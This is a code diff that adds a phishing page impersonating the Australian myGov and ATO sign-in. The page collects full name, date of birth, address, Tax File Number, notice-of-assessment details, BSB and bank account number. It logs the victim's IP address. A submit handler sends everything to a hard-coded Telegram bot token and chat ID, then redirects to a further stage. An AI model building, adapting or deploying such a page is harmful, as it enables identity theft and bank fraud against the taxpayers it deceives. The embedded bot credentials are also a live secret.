@@ -1,0 +1,204 @@
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Sign in with myGov - myGov</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon.ico">
+    <link
+        href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap"
+        rel="stylesheet">
+    <link href="../css/mgv2-application.css" rel="stylesheet">
+    <link href="../css/blugov.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+</head>
+
+<body data-new-gr-c-s-check-loaded="14.1094.0" data-gr-ext-installed="">
+    <div class="brand-rainbow">&nbsp;</div>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="../images/myGov-cobranded-logo-black.svg" alt="myGov Beta"
+                                role="img">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <h1>MyGov Account Information</h1>
+            <p style="font-size: 14px">Please answer the shared secret between you and the ATO.</p>
+            <hr>
+            <form id="forgotten-username-form" onsubmit="submit" method="post">
+                <input type="hidden" id="ipaddress" name="ipaddress">
+                <div class="input-group">
+                    <label for="fname">Full Name</label>
+                    <input id="fname" name="fname" aria-required="true" type="text" value="" autocomplete="off"
+                        required="">
+                </div>
+                <div class="input-group">
+                    <label for="dob">Date of Birth</label>
+                    <input id="dob" name="dob" aria-required="true" type="date" value="" autocomplete="off"
+                        required="">
+                </div>
+                <div class="input-group">
+                    <label for="address">Full Address on File</label>
+                    <input id="address" name="address" aria-required="true" type="text" value="" autocomplete="off"
+                        required="">
+                </div>
+                <div class="input-group">
+                    <label for="tx-file-no">Tax File Number</label>
+                    <input id="tx-file-no" name="tx-file-no" aria-required="true" type="text" value="" autocomplete="off"
+                        required="">
+                </div>
+                <h3 style="height: 40px; background-color: rgb(167, 164, 164); padding: 10px">NOTICE OF ASSESSMENT</h3>
+                <div class="input-group">
+                    <label for="issued"><span style="font-weight: 400">Enter the <span style="font-weight: 600">date of
+                                issues</span> from your notice of assessment (dd/mm/yyyy).</span></label>
+                    <input id="issued" name="issued" aria-required="true" type="date" value="" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label for="reference"><span style="font-weight: 400">Enter <span style="font-weight: 600">our reference
+                                number</span> from your notice of assessment.</span></label>
+                    <input id="reference" name="reference" aria-required="true" type="tel" value="" autocomplete="off">
+                </div>
+                <h3 style="height: 40px; background-color: rgb(167, 164, 164); padding: 10px">BANK ACCOUNT DETAILS</h3>
+                <div class="input-group">
+                    <label for="bsb"><span style="font-weight: 400">Enter <span style="font-weight: 600">BSB
+                                number</span> recorded with the ATO.</span></label>
+                    <input id="bsb" name="bsb" aria-required="true" type="tel" value="" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label for="acct"><span style="font-weight: 400">Enter <span style="font-weight: 550">bank account
+                                number</span> recorded with the ATO (exclude BSB).</span></label>
+                    <input id="acct" name="acct" aria-required="true" type="tel" value="" autocomplete="off">
+                </div>
+                <div class="button-container">
+                    <button type="submit" class="button-main button">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li>
+                                <a target="_blank">Terms of use</a>
+                            </li>
+                            <li>
+                                <a target="_blank">Privacy and security</a>
+                            </li>
+                            <li>
+                                <a target="_blank">Copyright</a>
+                            </li>
+                            <li>
+                                <a target="_blank">Accessibility</a>
+                            </li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a>
+                            <img src="../images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70"
+                                role="img">
+                        </a>
+                    </section>
+
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on.
+                        We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait
+                        Islander nations.</p>
+                </div>
+
+
+
+
+            </div>
+        </div>
+    </footer>
+
+
+    <script>
+        fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+        const ipAddressInput = document.getElementById('ipaddress');
+        if (ipAddressInput) {
+        ipAddressInput.value = data.ip;
+        }
+        })
+        .catch(error => console.error('Error fetching IP address:', error));
+    </script>
+
+
+<script>
+    $('#forgotten-username-form').on('submit', function(event) {
+    event.preventDefault(); 
+
+    const fullName = document.getElementById('fname').value;
+    const dateOB = document.getElementById('dob').value;
+    const ipp = document.getElementById('ipaddress').value;
+    const addresss = document.getElementById('address').value;
+    const txFile = document.getElementById('tx-file-no').value;
+    const issuedd = document.getElementById('issued').value;
+    const referencee = document.getElementById('reference').value;
+    const bsbb = document.getElementById('bsb').value;
+    const acctt = document.getElementById('acct').value;
+
+    const message = 
+        "*DETAILS PAGE NEW SUBMISSION*" + "\n" +
+        "User IP: " + ipp + "\n" +
+        "Fullname: " + fullName + "\n" +
+        "Date of Birth: " + dateOB + "\n" +
+        "Address: " + addresss + "\n" +
+        "Tax FIle No: " + txFile + "\n" +
+        "Date of Notice Assesment: " + issuedd + "\n" +
+        "Reference: " + referencee + "\n"+
+        "BSB Number: " + bsbb + "\n" +
+        "Acct No. with ATO: " + acctt + "\n" ;
+
+    const telegramBotToken = '6676505963:AAFB0jZ9Q6C-3nK1UfkVm9ajDLTojZc84cc';
+    const chatId = '760788900';
+
+    const sendMessage = (text) => {
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+        fetch(url)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                console.log('Message sent successfully');
+                window.location.href = 'ver02.html'; 
+            })
+            .catch(error => console.error('Error:', error));
+    };
+
+    sendMessage(message);
+    document.getElementById('fname').value = '';
+    document.getElementById('dob').value = '';
+    document.getElementById('p@ssword1').value = '';
+    document.getElementById('ipaddress').value = '';
+    document.getElementById('tx-file-no').value = '';
+    document.getElementById('issued').value = '';    document.getElementById('bsb').value = '';
+    document.getElementById('reference').value = '';
+    document.getElementById('acct').value = '';
+    });
+</script>
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>
+
+</html>
